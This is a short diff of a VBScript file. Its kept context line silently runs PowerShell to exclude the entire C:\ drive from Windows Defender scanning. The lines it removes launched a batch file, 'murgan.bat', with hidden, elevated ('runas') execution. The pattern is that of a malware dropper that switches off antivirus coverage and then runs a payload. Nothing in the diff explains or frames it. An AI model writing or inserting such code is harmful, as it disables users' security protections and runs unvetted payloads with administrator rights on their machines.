@@ -5,8 +5,3 @@ End If
 
 CreateObject("WScript.Shell").Run "powershell -Command Add-MpPreference -ExclusionPath 'C:\'", 0, True
 
-
-Set objShell = CreateObject("Shell.Application")
-strPath = WScript.ScriptFullName
-strFolder = Left(strPath, InStrRev(strPath, "\"))
-objShell.ShellExecute "cmd.exe", "/c " & strFolder & "murgan.bat", "", "runas", 0
